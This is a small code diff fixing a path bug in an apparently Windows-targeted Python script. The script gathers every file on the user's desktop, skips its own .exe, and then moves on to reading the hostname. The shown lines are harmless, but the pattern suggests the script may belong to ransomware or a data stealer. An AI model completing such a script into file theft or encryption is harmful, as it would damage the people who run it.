@@ -47,7 +47,7 @@ files = os.listdir(desktop_path)
 abs_files = []
 for f in files:
     if os.path.isfile(f"{desktop_path}\\{f}") and f != __file__[:-2]+'exe':
-        abs_files.append(f"{desktop_path}\\f")
+        abs_files.append(f"{desktop_path}\\{f}")
 print("dosya yollarını başarıyla alıdı")
 
 # Hostname
